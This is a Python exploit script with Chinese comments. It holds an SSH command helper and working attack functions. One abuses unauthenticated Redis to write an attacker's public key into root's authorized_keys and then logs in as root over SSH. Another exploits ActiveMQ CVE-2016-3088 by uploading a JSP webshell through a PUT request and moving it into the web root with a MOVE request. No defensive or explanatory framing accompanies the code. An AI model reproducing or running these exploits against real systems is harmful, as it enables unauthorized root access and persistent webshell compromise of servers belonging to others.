#! /usr/bin/env python
# _*_  coding:utf-8 _*_

import paramiko
import redis
import requests

# ssh一键化执行命令
def SSHCommond(ip, port, user, passwd, shell, private_key):
    try:
        # 创建一个ssh对象
        ssh = paramiko.SSHClient()
        if private_key is not None and passwd is None:
            # 读取私钥
            private_key = paramiko.RSAKey.from_private_key_file(private_key)
            # 解决问题:如果之前没有，连接过的ip，会出现选择yes或者no的操作，
            # 自动选择yes
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            # 连接服务器
            ssh.connect(hostname=ip, port=port, username=user, pkey=private_key)
        elif passwd is not None and private_key is None:
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname=ip, port=port, username=user, password=passwd)
        else:
            return '格式错误,请重新输入'
        # 执行操作
        stdin, stdout, stderr = ssh.exec_command(shell)
        # 获取命令执行的结果
        str1 = stdout.read().decode('utf-8')
        return str1
    except paramiko.ssh_exception.AuthenticationException:
        print("认证失败")
    else:
        print("SSH连接命令执行成功")

# redis未授权漏洞利用
def RedisWeiShouQuan(ip, redis_port, public_key, ssh_port, private_key):
    r = redis.Redis(host=ip, port=redis_port)
    pk = ('\n\n' + open(public_key, "r").read() + '\n\n')
    r.set('xx', pk)
    r.config_set("dir", "/root/.ssh/")
    r.config_set("dbfilename", "authorized_keys")
    r.save()
    print(SSHCommond(ip=ip, port=ssh_port, user='root', passwd=None, shell='id', private_key=private_key))
    return '运行完成'
# activemq漏洞利用
def CVE_2016_3088(url, jsp_ma, move_root_path):
    headers_put = {
        'Content-Type': "application/json",
        'Accept-Encoding': "gzip, deflate",
        'Accept': "*/*",
        'Accept-Language': 'en-US;q=0.9,en;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
        'Connection': 'close'
    }
    ant = open(jsp_ma, "r").read()  # 一句话木马，蚁剑密码ant
    data_put = ant
    URL = url + "/fileserver/ant"
    r = requests.put(url=URL, headers=headers_put, data=data_put)  # 提交PUT请求
    headers_move = {
        'Destination': "file://" + move_root_path + '/ant.jsp',  # 目标移动地址
        'Accept': "*/*",
        'Accept-Language': 'en-US;q=0.9,en;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
        'Connection': 'close'
    }
    m = requests.request('MOVE', url=URL, headers=headers_move)  # 提交MOVE请求
    print("上传响应:" + str(r) + "\n访问参考该链接：" + url + "/api/ant.jsp\n响应请求：" + str(m))
    return '运行结束(204响应即表示成功)'
